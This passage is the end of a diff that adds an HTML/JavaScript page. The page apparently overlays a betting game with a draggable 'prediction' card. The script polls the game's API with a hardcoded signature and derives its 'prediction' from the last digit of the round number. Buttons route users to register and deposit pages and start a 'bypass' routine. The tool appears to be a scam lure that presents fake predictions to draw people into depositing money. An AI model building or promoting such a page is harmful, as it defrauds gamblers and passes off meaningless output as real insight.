+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({typeId:1,language:0,random:"40079dcba93a48769c6ee9d4d4fae23f",signature:"D12108C4F57C549D82B23A91E0FA20AE",timestamp:1727792520})
+    });
+    var j=await res.json();
+    if(j && j.code===0 && j.data && j.data.issueNumber){
+      var cur=j.data.issueNumber.toString();
+      if(cur!==lastPeriod){
+        lastPeriod=cur;
+        var lg=LOGIC[parseInt(cur.slice(-1))];
+        if(lg) predData=lg;
+      }
+    }
+  }catch(e){}
+}
+
+var mini=document.getElementById('mini');
+var opened = false;
+
+function openCard(){
+  if(opened) return;
+  opened=true;
+  mini.style.display='none';
+  stage.style.display='';
+  stage.classList.remove('spd-close');
+  stage.classList.add('spd-open');
+  updateUI();
+}
+function closeCard(){
+  if(bypassRunning) return;
+  if(!opened) return;
+  opened=false;
+  setShellLaserFast(false);
+  stage.classList.remove('spd-open');
+  stage.classList.add('spd-close');
+  mini.style.display='flex';
+  setTimeout(function(){
+    if(!opened){ stage.style.display='none'; stage.classList.remove('spd-close'); }
+  },220);
+}
+
+function makeDraggable(el, clickCallback){
+  var sx=0,sy=0,ox=0,oy=0,isDragging=false,hasMoved=false;
+  function start(e){
+    if(e.target.closest && e.target.closest('button')) return;
+    if(e.target.tagName && e.target.tagName.toLowerCase()==='button') return;
+    var p = e.touches ? e.touches[0] : e;
+    sx=p.clientX; sy=p.clientY;
+    var comp=window.getComputedStyle(el);
+    ox=parseInt(comp.left,10); oy=parseInt(comp.top,10);
+    if(isNaN(ox)) ox=el.offsetLeft||0;
+    if(isNaN(oy)) oy=el.offsetTop||0;
+    isDragging=true; hasMoved=false;
+    el.style.transition='none';
+    if(el.id==='mini'){ el.style.animation='none'; }
+  }
+  function move(e){
+    if(!isDragging) return;
+    var p = e.touches ? e.touches[0] : e;
+    var dx=p.clientX-sx, dy=p.clientY-sy;
+    if(Math.abs(dx)>5 || Math.abs(dy)>5) hasMoved=true;
+    el.style.left=Math.max(4, Math.min(window.innerWidth-el.offsetWidth-4, ox+dx))+'px';
+    el.style.top=Math.max(4, Math.min(window.innerHeight-el.offsetHeight-4, oy+dy))+'px';
+    if(e.cancelable) e.preventDefault();
+  }
+  function end(){
+    if(!isDragging) return;
+    isDragging=false;
+    el.style.transition='';
+    if(el.id==='mini'){ el.style.animation='fab-float 3.4s ease-in-out infinite'; }
+    if(!hasMoved && typeof clickCallback==='function') clickCallback();
+  }
+  el.addEventListener('touchstart', start, {passive:true});
+  el.addEventListener('mousedown', start, false);
+  document.addEventListener('touchmove', move, {passive:false});
+  document.addEventListener('mousemove', move, false);
+  document.addEventListener('touchend', end);
+  document.addEventListener('mouseup', end);
+}
+
+makeDraggable(mini, openCard);
+makeDraggable(stage, null);
+
+attachBtnHandler('warnRegBtn', function(){ hideWarnOverlay(); navTo(REGISTER_URL); });
+attachBtnHandler('btnAuthArea', function(){ navAndHide(REGISTER_URL); });
+attachBtnHandler('btnLockedArea', function(){ navAndHide(DEPOSIT_URL); });
+attachBtnHandler('btnWingoArea', function(){ navAndHide(WINGO_URL); });
+attachBtnHandler('btnResultArea', function(){ runBypass(); });
+attachBtnHandler('spd-hide', function(){ closeCard(); });
+
+window.addEventListener('load', function(){
+  updateUI();
+  gameFrame.src=REGISTER_URL;
+  fetchPeriod();
+  /* OPTIMIZED: 5000ms (was 2500ms) — 2x fewer network calls */
+  setInterval(fetchPeriod, 5000);
+});
+</script>
+</body>
+</html>
